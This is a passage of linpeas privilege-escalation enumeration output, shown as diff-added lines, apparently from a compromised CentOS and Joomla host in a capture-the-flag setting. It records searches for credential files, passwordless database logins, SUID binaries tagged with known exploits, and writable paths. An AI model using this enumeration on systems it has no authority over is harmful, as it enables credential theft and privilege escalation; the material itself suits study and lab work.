+[+] MySQL connection using root/NOPASS ................. No
+[+] Looking for mysql credentials and exec
+From '/usr/share/mysql/my-huge.cnf' Mysql user: 
+From '/usr/share/mysql/my-innodb-heavy-4G.cnf' Mysql user: 
+From '/usr/share/mysql/my-large.cnf' Mysql user: 
+From '/usr/share/mysql/my-medium.cnf' Mysql user: 
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.6 (CentOS)
+Server built:   Aug  8 2019 11:41:18
+PHP exec extensions
+
+[+] Looking for PHPCookies
+ Not Found
+
+[+] Looking for Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Looking for Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Looking for Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+
+[+] Looking for supervisord configuration file
+supervisord.conf Not Found
+
+[+] Looking for cesi configuration file
+cesi.conf Not Found
+
+[+] Looking for Rsyncd config file
+rsyncd.conf Not Found
+[+] Looking for Hostapd config file
+hostapd.conf Not Found
+
+[+] Looking for wifi conns file
+/etc/NetworkManager/system-connections/
+
+[+] Looking for Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Looking for .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Looking for ldap directories and their hashes
+/var/www/html/libraries/vendor/joomla/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Looking for .ovpn files and credentials
+.ovpn Not Found
+
+[+] Looking for ssl/ssh files
+  --> Some certificates were found (out limited):
+/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem
+/etc/pki/ca-trust/source/ca-bundle.legacy.crt
+
+ --> /etc/hosts.allow file found, read the rules:
+
+
+
+Looking inside /etc/ssh/ssh_config for interesting info
+Host *
+	GSSAPIAuthentication yes
+	ForwardX11Trusted yes
+	SendEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
+	SendEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
+	SendEnv LC_IDENTIFICATION LC_ALL LANGUAGE
+	SendEnv XMODIFIERS
+
+[+] Looking for unexpected auth lines in /etc/pam.d/sshd
+auth	   required	pam_sepermit.so
+auth       substack     password-auth
+auth       include      postlogin
+-auth      optional     pam_reauthorize.so prepare
+account    include      password-auth
+password   include      password-auth
+session    include      password-auth
+-session   optional     pam_reauthorize.so prepare
+
+[+] Looking for Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Looking for kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+ default_ccache_name = KEYRING:persistent:%{uid}
+tickets kerberos Not Found
+klist Not Found
+
+[+] Looking for Kibana yaml
+kibana.yml Not Found
+
+[+] Looking for Knock configuration
+Knock.config Not Found
+
+[+] Looking for logstash files
+ Not Found
+
+[+] Looking for elasticsearch files
+ Not Found
+
+[+] Looking for Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Looking for AD cached hashes
+cached hashes Not Found
+
+[+] Looking for screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Looking for tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Looking for Couchdb directory
+
+[+] Looking for redis.conf
+
+[+] Looking for dovecot files
+dovecot credentials Not Found
+
+[+] Looking for mosquitto.conf
+
+[+] Looking for neo4j auth file
+
+[+] Looking Cloud-Init conf file
+
+[+] Looking Erlang cookie file
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/bin/chsh
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/su
+/usr/bin/sudo		--->	/sudo$
+/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/usr/bin/umount		--->	BSD/Linux(08-1996)
+/usr/bin/crontab
+/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/bin/wall
+/usr/bin/write
+/usr/bin/ssh-agent
+/usr/sbin/netreport
+/usr/sbin/postdrop
+/usr/sbin/postqueue
+/usr/libexec/utempter/utempter
+/usr/libexec/openssh/ssh-keysign
+
+[+] Writable folders configured in /etc/ld.so.conf.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
+/usr/lib64//bind9-export/
+/usr/lib64/mysql
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+[+] Users with capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+/usr/bin/lesspipe.sh
+/usr/bin/gettext.sh
+/usr/bin/setup-nsssysinit.sh
+/usr/bin/rescan-scsi-bus.sh
+
+[+] Unexpected folders in root
+
+[+] Files (scripts) in /etc/profile.d/
+total 68
+drwxr-xr-x.  2 root root  251 Dec 14  2019 .
+drwxr-xr-x. 79 root root 8192 Jan 14  2020 ..
+-rw-r--r--.  1 root root  771 Aug  8  2019 256term.csh
+-rw-r--r--.  1 root root  841 Aug  8  2019 256term.sh
+-rw-r--r--.  1 root root  196 Mar 24  2017 colorgrep.csh
+-rw-r--r--.  1 root root  201 Mar 24  2017 colorgrep.sh
+-rw-r--r--.  1 root root 1741 Aug  6  2019 colorls.csh
+-rw-r--r--.  1 root root 1606 Aug  6  2019 colorls.sh
+-rw-r--r--.  1 root root   80 Oct 30  2018 csh.local
+-rw-r--r--.  1 root root 1706 Aug  8  2019 lang.csh
+-rw-r--r--.  1 root root 2703 Aug  8  2019 lang.sh
+-rw-r--r--.  1 root root  123 Jul 30  2015 less.csh
+-rw-r--r--.  1 root root  121 Jul 30  2015 less.sh
+-rw-r--r--.  1 root root   81 Oct 30  2018 sh.local
+-rw-r--r--.  1 root root  164 Jan 27  2014 which2.csh
+-rw-r--r--.  1 root root  169 Jan 27  2014 which2.sh
+
+[+] Hashes inside passwd file? ........... No
+[+] Hashes inside group file? ............ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read root folder? .............. No
+
+[+] Looking for root files in home dirs (limit 20)
+/home
+
+[+] Looking for others files in folders owned by me
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/cron
+/var/log/messages
+/var/log/secure
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+#)You_can_write_more_log_files_inside_last_directory
+
+[+] Files inside /home/apache (limit 20)
+
+[+] Files inside others home (limit 20)
+
+[+] Looking for installed mail applications
+mailq.postfix
+newaliases.postfix
+rmail.postfix
+postfix
+postfix
+sendmail
+sendmail.postfix
+mailq.postfix
+newaliases.postfix
+rmail.postfix
+postfix
+sendmail
+sendmail.postfix
+
+[+] Mails (limit 50)
+/var/mail/jjameson
+/var/spool/mail/jjameson
+
+[+] Backup files?
+-rw-r--r-- 1 root root 32791 Jan 14  2020 /var/log/dmesg.old
+-rw-r--r--. 1 root root 1938 Aug  6  2019 /etc/nsswitch.conf.bak
+
+[+] Looking for tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/www/html/libraries/joomla/http/transport/cacert.pem (limit 20)
+ -> Extracting tables from /etc/aliases.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/cert8.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/key3.db (limit 20)
+ -> Extracting tables from /etc/openldap/certs/secmod.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/cert8.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
+
+ -> Extracting tables from /etc/pki/nssdb/key3.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
+
+ -> Extracting tables from /etc/pki/nssdb/secmod.db (limit 20)
+
+[+] Web files?(output limit)
+/var/www/:
+total 4.0K
+drwxr-xr-x.  4 root   root     33 Dec 14  2019 .
+drwxr-xr-x. 20 root   root    278 Dec 14  2019 ..
+drwxr-xr-x.  2 root   root      6 Aug  8  2019 cgi-bin
+drwxr-xr-x. 17 apache apache 4.0K Dec 14  2019 html
+
+/var/www/cgi-bin:
+total 0
+drwxr-xr-x. 2 root root  6 Aug  8  2019 .
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r--. 1 root root 2853 Oct 30  2018 /etc/bashrc
+-rw-r--r--. 1 root root 11753 Aug  6  2019 /etc/httpd/conf/httpd.conf
+Reading /etc/httpd/conf/httpd.conf
+ServerRoot "/etc/httpd"
+Listen 80
+Include conf.modules.d/*.conf
+User apache
+Group apache
+ServerAdmin root@localhost
+<Directory />
+    AllowOverride none
+    Require all denied
+</Directory>
+DocumentRoot "/var/www/html"
+<Directory "/var/www">
+    AllowOverride None
+    Require all granted
+</Directory>
+<Directory "/var/www/html">
+    Options Indexes FollowSymLinks
+    AllowOverride None
+    Require all granted
+</Directory>
+<IfModule dir_module>
+    DirectoryIndex index.html
+</IfModule>
+<Files ".ht*">
+    Require all denied
+</Files>
+ErrorLog "logs/error_log"
+LogLevel warn
+<IfModule log_config_module>
+    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %b" common
+    <IfModule logio_module>
+      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
+    </IfModule>
+    CustomLog "logs/access_log" combined
+</IfModule>
+<IfModule alias_module>
+    ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
+</IfModule>
+<Directory "/var/www/cgi-bin">
+    AllowOverride None
+    Options None
+    Require all granted
+</Directory>
+<IfModule mime_module>
+    TypesConfig /etc/mime.types
+    AddType application/x-compress .Z
+    AddType application/x-gzip .gz .tgz
+    AddType text/html .shtml
+    AddOutputFilter INCLUDES .shtml
+</IfModule>
+AddDefaultCharset UTF-8
+<IfModule mime_magic_module>
+    MIMEMagicFile conf/magic
+</IfModule>
+EnableSendfile on
+IncludeOptional conf.d/*.conf
+
+-rw-r--r--. 1 root root 231 Aug  8  2019 /etc/skel/.bashrc
+-rw-r--r--. 1 root root 77 Aug  6  2019 /usr/lib/tmpfiles.d/httpd.conf
+Reading /usr/lib/tmpfiles.d/httpd.conf
+d /run/httpd   710 root apache
+d /run/httpd/htcacheclean   700 apache apache
+
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r--. 1 root root 167 Aug  7  2019 /boot/.vmlinuz-3.10.0-1062.el7.x86_64.hmac
+-rw-r--r-- 1 root root 0 Oct 26 09:16 /run/initramfs/.need_shutdown
+-rw-r--r--. 1 root root 18 Aug  8  2019 /etc/skel/.bash_logout
+-rw-r--r--. 1 root root 193 Aug  8  2019 /etc/skel/.bash_profile
+-rw-r--r--. 1 root root 129 Aug  8  2019 /etc/selinux/targeted/.policy.sha512
+-rw-------. 1 root root 0 Dec 14  2019 /etc/.pwd.lock
+-rw-r--r--. 1 root root 163 Dec 14  2019 /etc/.updated
+-rw-r--r--. 1 root root 0 Dec 14  2019 /var/lib/rpm/.dbenv.lock
+-rw-r--r--. 1 root root 0 Dec 14  2019 /var/lib/rpm/.rpm.lock
+-rw-r--r--. 1 root root 0 Dec 14  2019 /var/cache/yum/x86_64/7/.gpgkeyschecked.yum
+-rw-r--r--. 1 root root 163 Dec 14  2019 /var/.updated
+-rwxr-xr-x. 1 apache apache 150 Apr 25  2017 /var/www/html/libraries/vendor/.htaccess
+-rw-r--r--. 1 root root 65 Aug  2  2017 /usr/lib64/.libgcrypt.so.11.hmac
+-rw-r--r--. 1 root root 65 Aug  8  2019 /usr/lib64/.libcrypto.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Aug  8  2019 /usr/lib64/.libssl.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 40 Aug  8  2019 /usr/share/man/man1/..1.gz
+-rw-r--r--. 1 root root 42 Jan 29  2019 /usr/share/man/man5/.k5identity.5.gz
+-rw-r--r--. 1 root root 39 Jan 29  2019 /usr/share/man/man5/.k5login.5.gz
+-rw-r--r--. 1 root root 2328 Apr 23  2013 /usr/share/kde4/apps/kdm/themes/CentOS7/.colorlsCZ1
+-rw-r--r-- 1 root root 0 Dec 14  2019 /.autorelabel
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
+-rwxr--r-- 1 apache apache 225747 Jun 17 21:12 /tmp/linpeas.sh
+-rw-r--r-- 1 apache apache 3736 Sep  9  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/base/repomd.xml
+-rw-r--r-- 1 apache apache 0 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/base/cachecookie
+-rw-r--r-- 1 apache apache 543 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/base/mirrorlist.txt
+-rw-r--r-- 1 apache apache 5479 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/epel/repomd.xml
+-rw-r--r-- 1 apache apache 0 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/epel/cachecookie
+-rw-r--r-- 1 apache apache 18150 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/epel/metalink.xml
+-rw-r--r-- 1 apache apache 2993 Oct 22  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/extras/repomd.xml
+-rw-r--r-- 1 apache apache 0 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/extras/cachecookie
+-rw-r--r-- 1 apache apache 568 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/extras/mirrorlist.txt
+-rw-r--r-- 1 apache apache 3097 Dec 14  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/repomd.xml
+-rw-r--r-- 1 apache apache 0 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/cachecookie
+-rw-r--r-- 1 apache apache 3056 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/mirrorlist.txt
+-rw-r--r-- 1 apache apache 3106 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/repomd.xml
+-rw-r--r-- 1 apache apache 0 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/cachecookie
+-rw-r--r-- 1 apache apache 3121 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/mirrorlist.txt
+-rw-r--r-- 1 apache apache 3007 Dec 12  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/updates/repomd.xml
+-rw-r--r-- 1 apache apache 0 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/updates/cachecookie
+-rw-r--r-- 1 apache apache 602 Dec 15  2019 /var/tmp/yum-apache-SJfQTl/x86_64/7/updates/mirrorlist.txt
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+awk: cmd. line:1: (FILENAME=- FNR=846) fatal: print to "standard output" failed (Broken pipe)
+uniq: write error: Broken pipe
+/dev/mqueue
+/dev/mqueue/linpeas.txt18980
+/dev/shm
+/tmp
+/tmp/linpeas.sh
+/var/cache/httpd
+/var/cache/httpd/proxy
+/var/lib/dav
+/var/lib/php/session/sess_nvuatc4tban8ks2r2o7homh861
+/var/tmp
+/var/tmp/yum-apache-SJfQTl
+/var/tmp/yum-apache-SJfQTl/x86_64
+/var/tmp/yum-apache-SJfQTl/x86_64/7
+/var/tmp/yum-apache-SJfQTl/x86_64/7/base
+/var/tmp/yum-apache-SJfQTl/x86_64/7/base/cachecookie
+/var/tmp/yum-apache-SJfQTl/x86_64/7/base/gen
+/var/tmp/yum-apache-SJfQTl/x86_64/7/base/mirrorlist.txt
+/var/tmp/yum-apache-SJfQTl/x86_64/7/base/packages
+/var/tmp/yum-apache-SJfQTl/x86_64/7/base/repomd.xml
+/var/tmp/yum-apache-SJfQTl/x86_64/7/epel
+/var/tmp/yum-apache-SJfQTl/x86_64/7/epel/cachecookie
+/var/tmp/yum-apache-SJfQTl/x86_64/7/epel/gen
+/var/tmp/yum-apache-SJfQTl/x86_64/7/epel/metalink.xml
+/var/tmp/yum-apache-SJfQTl/x86_64/7/epel/packages
+/var/tmp/yum-apache-SJfQTl/x86_64/7/epel/repomd.xml
+/var/tmp/yum-apache-SJfQTl/x86_64/7/extras
+/var/tmp/yum-apache-SJfQTl/x86_64/7/extras/cachecookie
+/var/tmp/yum-apache-SJfQTl/x86_64/7/extras/gen
+/var/tmp/yum-apache-SJfQTl/x86_64/7/extras/mirrorlist.txt
+/var/tmp/yum-apache-SJfQTl/x86_64/7/extras/packages
+/var/tmp/yum-apache-SJfQTl/x86_64/7/extras/repomd.xml
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/cachecookie
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/gen
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/mirrorlist.txt
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/packages
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-php56/repomd.xml
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/cachecookie
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/gen
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/mirrorlist.txt
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/packages
+/var/tmp/yum-apache-SJfQTl/x86_64/7/remi-safe/repomd.xml
+/var/tmp/yum-apache-SJfQTl/x86_64/7/updates
+/var/tmp/yum-apache-SJfQTl/x86_64/7/updates/cachecookie
+/var/tmp/yum-apache-SJfQTl/x86_64/7/updates/gen
+/var/tmp/yum-apache-SJfQTl/x86_64/7/updates/mirrorlist.txt
+/var/tmp/yum-apache-SJfQTl/x86_64/7/updates/packages
+/var/tmp/yum-apache-SJfQTl/x86_64/7/updates/repomd.xml
+/var/www/html
+/var/www/html/LICENSE.txt
+/var/www/html/README.txt
+/var/www/html/administrator
+/var/www/html/administrator/cache
+/var/www/html/administrator/cache/index.html
+/var/www/html/administrator/components
+/var/www/html/administrator/components/com_admin
+/var/www/html/administrator/components/com_admin/admin.php
+/var/www/html/administrator/components/com_admin/admin.xml
+/var/www/html/administrator/components/com_admin/controller.php
+/var/www/html/administrator/components/com_admin/controllers
+/var/www/html/administrator/components/com_admin/controllers/profile.php
+/var/www/html/administrator/components/com_admin/helpers
+/var/www/html/administrator/components/com_admin/helpers/html
+/var/www/html/administrator/components/com_admin/helpers/html/directory.php
+/var/www/html/administrator/components/com_admin/helpers/html/phpsetting.php
+/var/www/html/administrator/components/com_admin/helpers/html/system.php
+/var/www/html/administrator/components/com_admin/models
+/var/www/html/administrator/components/com_admin/models/forms
+/var/www/html/administrator/components/com_admin/models/forms/profile.xml
+/var/www/html/administrator/components/com_admin/models/help.php
+/var/www/html/administrator/components/com_admin/models/profile.php
+/var/www/html/administrator/components/com_admin/models/sysinfo.php
+/var/www/html/administrator/components/com_admin/postinstall
+/var/www/html/administrator/components/com_admin/postinstall/eaccelerator.php
+/var/www/html/administrator/components/com_admin/postinstall/htaccess.php
+/var/www/html/administrator/components/com_admin/postinstall/joomla40checks.php
+/var/www/html/administrator/components/com_admin/postinstall/languageaccess340.php
+/var/www/html/administrator/components/com_admin/postinstall/phpversion.php
+/var/www/html/administrator/components/com_admin/postinstall/statscollection.php
+/var/www/html/administrator/components/com_admin/script.php
+/var/www/html/administrator/components/com_admin/sql
+/var/www/html/administrator/components/com_admin/sql/others
+/var/www/html/administrator/components/com_admin/sql/others/mysql
+/var/www/html/administrator/components/com_admin/sql/others/mysql/utf8mb4-conversion-01.sql
+/var/www/html/administrator/components/com_admin/sql/others/mysql/utf8mb4-conversion-02.sql
+/var/www/html/administrator/components/com_admin/sql/updates
+/var/www/html/administrator/components/com_admin/sql/updates/mysql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-06.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-16.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-19.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-20.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-21-1.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-21-2.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-22.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-23.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2011-12-24.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2012-01-10.sql
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/2.5.0-2012-01-14.sql
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.0.0.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.0.1.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.0.2.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.0.3.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.1.0.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.1.1.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.1.2.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.1.3.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.1.4.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.1.5.sql
+/var/www/html/administrator/components/com_admin/sql/updates/postgresql/3.2.0.sql
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.2-2012-03-05.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.3-2012-03-13.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.4-2012-03-18.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.4-2012-03-19.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.5.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.6.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/2.5.7.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/3.0.0.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/3.0.1.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/3.0.2.sql
+/var/www/html/administrator/components/com_admin/sql/updates/sqlazure/3.0.3.sql
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/administrator/components/com_admin/views/help
+/var/www/html/administrator/components/com_admin/views/help/tmpl
+/var/www/html/administrator/components/com_admin/views/help/tmpl/default.php
+/var/www/html/administrator/components/com_admin/views/help/tmpl/default.xml
+/var/www/html/administrator/components/com_admin/views/help/view.html.php
+/var/www/html/administrator/components/com_admin/views/profile
+/var/www/html/administrator/components/com_admin/views/profile/tmpl
+/var/www/html/administrator/components/com_admin/views/profile/tmpl/edit.php
+/var/www/html/administrator/components/com_admin/views/profile/view.html.php
+/var/www/html/administrator/components/com_admin/views/sysinfo
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default.xml
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default_config.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default_directory.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default_phpinfo.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default_phpsettings.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default_system.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/view.html.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/view.json.php
+/var/www/html/administrator/components/com_admin/views/sysinfo/view.text.php
+/var/www/html/administrator/components/com_ajax
+/var/www/html/administrator/components/com_ajax/ajax.php
+/var/www/html/administrator/components/com_ajax/ajax.xml
+/var/www/html/administrator/components/com_associations
+/var/www/html/administrator/components/com_associations/access.xml
+/var/www/html/administrator/components/com_associations/associations.php
+/var/www/html/administrator/components/com_associations/associations.xml
+/var/www/html/administrator/components/com_associations/config.xml
+/var/www/html/administrator/components/com_associations/controller.php
+/var/www/html/administrator/components/com_associations/controllers
+/var/www/html/administrator/components/com_associations/controllers/association.php
+/var/www/html/administrator/components/com_associations/controllers/associations.php
+/var/www/html/administrator/components/com_associations/helpers
+/var/www/html/administrator/components/com_associations/helpers/associations.php
+/var/www/html/administrator/components/com_associations/layouts
+/var/www/html/administrator/components/com_associations/layouts/joomla
+/var/www/html/administrator/components/com_associations/layouts/joomla/searchtools
+/var/www/html/administrator/components/com_associations/layouts/joomla/searchtools/default
+/var/www/html/administrator/components/com_associations/layouts/joomla/searchtools/default/bar.php
+/var/www/html/administrator/components/com_associations/models
+/var/www/html/administrator/components/com_associations/models/association.php
+/var/www/html/administrator/components/com_associations/models/associations.php
+/var/www/html/administrator/components/com_associations/models/fields
+/var/www/html/administrator/components/com_associations/models/fields/itemlanguage.php
+/var/www/html/administrator/components/com_associations/models/fields/itemtype.php
+/var/www/html/administrator/components/com_associations/models/fields/modalassociation.php
+/var/www/html/administrator/components/com_associations/models/forms
+/var/www/html/administrator/components/com_associations/models/forms/association.xml
+/var/www/html/administrator/components/com_associations/models/forms/filter_associations.xml
+/var/www/html/administrator/components/com_associations/views
+/var/www/html/administrator/components/com_associations/views/association
+/var/www/html/administrator/components/com_associations/views/association/tmpl
+/var/www/html/administrator/components/com_associations/views/association/tmpl/edit.php
+/var/www/html/administrator/components/com_associations/views/association/view.html.php
+/var/www/html/administrator/components/com_associations/views/associations
+/var/www/html/administrator/components/com_associations/views/associations/tmpl
+/var/www/html/administrator/components/com_associations/views/associations/tmpl/default.php
+/var/www/html/administrator/components/com_associations/views/associations/tmpl/modal.php
+/var/www/html/administrator/components/com_associations/views/associations/view.html.php
+/var/www/html/administrator/components/com_banners
+/var/www/html/administrator/components/com_banners/access.xml
+/var/www/html/administrator/components/com_banners/banners.php
+/var/www/html/administrator/components/com_banners/banners.xml
+/var/www/html/administrator/components/com_banners/config.xml
+/var/www/html/administrator/components/com_banners/controller.php
+/var/www/html/administrator/components/com_banners/controllers
+/var/www/html/administrator/components/com_banners/controllers/banner.php
+/var/www/html/administrator/components/com_banners/controllers/banners.php
+/var/www/html/administrator/components/com_banners/controllers/client.php
+/var/www/html/administrator/components/com_banners/controllers/clients.php
+/var/www/html/administrator/components/com_banners/controllers/tracks.php
+/var/www/html/administrator/components/com_banners/controllers/tracks.raw.php
+/var/www/html/administrator/components/com_banners/helpers
+/var/www/html/administrator/components/com_banners/helpers/banners.php
+/var/www/html/administrator/components/com_banners/helpers/html
+/var/www/html/administrator/components/com_banners/helpers/html/banner.php
+/var/www/html/administrator/components/com_banners/models
+/var/www/html/administrator/components/com_banners/models/banner.php
+/var/www/html/administrator/components/com_banners/models/banners.php
+/var/www/html/administrator/components/com_banners/models/client.php
+/var/www/html/administrator/components/com_banners/models/clients.php
+/var/www/html/administrator/components/com_banners/models/download.php
+/var/www/html/administrator/components/com_banners/models/fields
